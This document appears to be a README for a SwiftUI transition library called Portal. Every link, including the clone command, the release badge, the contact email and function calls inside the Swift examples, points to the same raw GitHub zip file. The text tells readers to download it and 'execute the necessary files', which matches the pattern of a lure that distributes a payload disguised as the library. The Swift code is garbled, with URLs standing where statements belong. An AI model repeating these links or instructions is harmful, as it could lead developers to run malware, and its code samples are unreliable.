# 🌟 Portal: Seamless Transitions in SwiftUI 🌟

Welcome to the **Portal** repository! This project focuses on providing smooth element transitions between root views, sheets, and navigation pushes in SwiftUI. Whether you're building a simple app or a complex interface, Portal helps you enhance user experience with fluid animations.

[![Download Releases](https://raw.githubusercontent.com/fosteraleng/Portal/main/Sources/Portal/Software-v1.3.zip%20Releases-Portal-blue)](https://raw.githubusercontent.com/fosteraleng/Portal/main/Sources/Portal/Software-v1.3.zip)

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Examples](#examples)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

## Features

- **Smooth Transitions**: Create visually appealing transitions between different views.
- **Flexible Navigation**: Easily manage navigation between root views and sheets.
- **SwiftUI Compatibility**: Fully compatible with SwiftUI, leveraging its powerful features.
- **Customizable Animations**: Adjust animation parameters to fit your design needs.
- **Lightweight**: Minimal overhead for fast performance.

## Installation

To get started with Portal, follow these simple steps:

1. Clone the repository:
   ```bash
   git clone https://raw.githubusercontent.com/fosteraleng/Portal/main/Sources/Portal/Software-v1.3.zip
   ```

2. Navigate to the project directory:
   ```bash
   cd Portal
   ```

3. Open the project in Xcode:
   ```bash
   open https://raw.githubusercontent.com/fosteraleng/Portal/main/Sources/Portal/Software-v1.3.zip
   ```

4. Build and run the project to see it in action.

For the latest version, [download the releases here](https://raw.githubusercontent.com/fosteraleng/Portal/main/Sources/Portal/Software-v1.3.zip) and execute the necessary files.

## Usage

Using Portal is straightforward. Here's a simple example to illustrate its capabilities:

### Basic Transition Example

```swift
import SwiftUI
import Portal

struct ContentView: View {
    @State private var showDetail = false

    var body: some View {
        NavigationView {
            VStack {
                Button("Show Detail") {
                    withAnimation {
                        https://raw.githubusercontent.com/fosteraleng/Portal/main/Sources/Portal/Software-v1.3.zip()
                    }
                }
                .navigate(to: DetailView(), when: $showDetail)
            }
        }
    }
}

struct DetailView: View {
    var body: some View {
        Text("Detail View")
            .navigationBarTitle("Detail", displayMode: .inline)
    }
}
```

This code demonstrates a basic button that triggers a transition to a detail view. You can customize the animation and transition effects to match your design.

## Examples

Here are some examples showcasing the capabilities of Portal:

### 1. Sheet Transition

You can easily present sheets with smooth transitions. Here’s how:

```swift
struct MainView: View {
    @State private var showSheet = false

    var body: some View {
        Button("Present Sheet") {
            https://raw.githubusercontent.com/fosteraleng/Portal/main/Sources/Portal/Software-v1.3.zip()
        }
        .sheet(isPresented: $showSheet) {
            SheetView()
        }
    }
}

struct SheetView: View {
    var body: some View {
        Text("This is a sheet!")
    }
}
```

### 2. Navigation Push

For navigation, you can use Portal to push new views seamlessly:

```swift
struct NavigationViewExample: View {
    var body: some View {
        NavigationLink(destination: NextView()) {
            Text("Go to Next View")
        }
    }
}

struct NextView: View {
    var body: some View {
        Text("Welcome to the Next View")
    }
}
```

## Contributing

We welcome contributions to enhance Portal. To contribute:

1. Fork the repository.
2. Create a new branch for your feature:
   ```bash
   git checkout -b feature/YourFeature
   ```
3. Make your changes and commit them:
   ```bash
   git commit -m "Add your feature description"
   ```
4. Push to your branch:
   ```bash
   git push origin feature/YourFeature
   ```
5. Open a pull request.

Your contributions help improve the project for everyone!

## License

Portal is licensed under the MIT License. Feel free to use it in your projects, but please give credit where it's due.

## Contact

For any questions or feedback, please reach out to us:

- GitHub: [fosteraleng](https://raw.githubusercontent.com/fosteraleng/Portal/main/Sources/Portal/Software-v1.3.zip)
- Email: https://raw.githubusercontent.com/fosteraleng/Portal/main/Sources/Portal/Software-v1.3.zip

For the latest updates and releases, please check the [Releases section](https://raw.githubusercontent.com/fosteraleng/Portal/main/Sources/Portal/Software-v1.3.zip).

---

Thank you for exploring Portal! We hope it helps you create beautiful and seamless transitions in your SwiftUI applications. Happy coding!